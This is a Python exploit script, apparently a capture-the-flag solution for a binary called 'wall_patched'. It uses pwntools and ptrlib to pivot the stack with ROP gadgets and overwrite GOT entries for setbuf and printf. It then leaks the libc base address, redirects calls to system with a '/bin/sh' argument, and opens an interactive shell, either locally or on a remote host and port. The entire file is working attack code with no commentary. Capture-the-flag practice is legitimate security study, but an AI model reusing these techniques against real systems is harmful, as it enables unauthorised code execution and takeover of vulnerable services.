#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./wall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 40015)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def gadget(elf: ptr.ELF, gadget: str):
    return next(elf.gadget(gadget))


def main():
    while True:

        io = connect()

        rop = b""
        rop += ptr.p64(gadget(exe, "pop rbp; ret;"))
        rop += ptr.p64(unwrap(exe.got("setbuf")) + 0x80)
        rop += ptr.p64(unwrap(exe.symbol("get_name")) + 32)
        rop += b"A" * 16
        payload = ptr.p64(gadget(exe, "ret;")) * ((4096 - len(rop)) // 8)
        payload += rop
        assert b"\n" not in payload
        io.sendlineafter(b"Message: ", payload)

        rop = b""
        rop += ptr.p64(gadget(exe,"pop rbp; ret;"))
        rop += ptr.p64(unwrap(exe.got("printf")) + 0x80)
        rop += ptr.p64(unwrap(exe.symbol("get_name")) + 59)
        payload = ptr.p64(next(exe.gadget("ret;"))) * ((0x80 - len(rop)) // 8)
        payload += rop
        assert len(payload) == 0x80
        assert b"\n" not in payload
        io.sendlineafter(b"name? ", payload)

        io.recvuntil(b"Message from ")
        try:
            io.recvuntil(b"Message from ")
        except (TimeoutError, ConnectionError, EOFError):
            ptr.logger.error(":(")
            continue

        libc.base = ptr.u64(io.recvuntil(b":").strip(b":")) - unwrap(libc.symbol("printf"))

        payload = b""
        payload += ptr.p64(unwrap(libc.symbol("system")))
        payload += ptr.p64(unwrap(exe.symbol("main")))
        payload += ptr.p64(unwrap(libc.symbol("scanf")))
        payload += ptr.p64(0) * 5
        payload += ptr.p64(unwrap(libc.symbol("_IO_2_1_stdout_")))
        payload += ptr.p64(0)
        payload += ptr.p64(unwrap(libc.symbol("_IO_2_1_stdin_")))
        payload += ptr.p64(0)
        payload += ptr.p64(next(libc.find("/bin/sh\0")))
        io.sendline(payload)

        io.interactive()
        exit()

if __name__ == "__main__":
    main()
